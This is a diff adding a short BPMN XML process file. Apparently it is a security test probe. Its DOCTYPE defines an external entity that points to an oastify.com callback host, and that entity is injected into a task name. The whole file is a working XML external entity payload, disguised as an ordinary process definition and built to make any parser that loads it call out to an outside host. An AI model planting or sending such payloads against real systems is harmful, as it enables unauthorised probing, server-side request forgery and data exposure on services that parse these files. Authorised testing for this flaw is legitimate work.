@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE definitions [
+  <!ENTITY xxe SYSTEM "http://5z5mki2sb97blvkiw4yig4qhc8iz6tui.oastify.com/gfc-t23-bpmn-xxe">
+]>
+<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL" targetNamespace="http://example.com/t23">
+  <process id="p1" isExecutable="false">
+    <task id="t1" name="&xxe;"/>
+  </process>
+</definitions>
